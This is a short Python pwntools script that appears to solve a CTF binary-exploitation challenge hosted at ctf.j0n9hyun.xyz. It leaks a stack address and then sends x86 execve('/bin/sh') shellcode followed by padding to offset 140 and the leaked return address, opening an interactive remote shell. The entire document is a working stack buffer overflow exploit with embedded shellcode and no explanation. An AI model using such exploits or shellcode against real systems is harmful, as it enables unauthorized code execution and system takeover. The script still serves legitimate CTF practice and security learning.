from pwn import *
p = remote("ctf.j0n9hyun.xyz",3006)
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
test = "AAAA"
p.recvuntil("Data : ")
p.sendline(test)
addr = int(p.recv(10),16)
print(addr)
lange = 140
p.recvuntil("Again (y/n): ")
p.sendline("y")
p.recvuntil("Data : ")
payload = shell
payload += "\x81"*(lange-25)
payload +=p32(addr)
p.sendline(payload)
p.interactive()
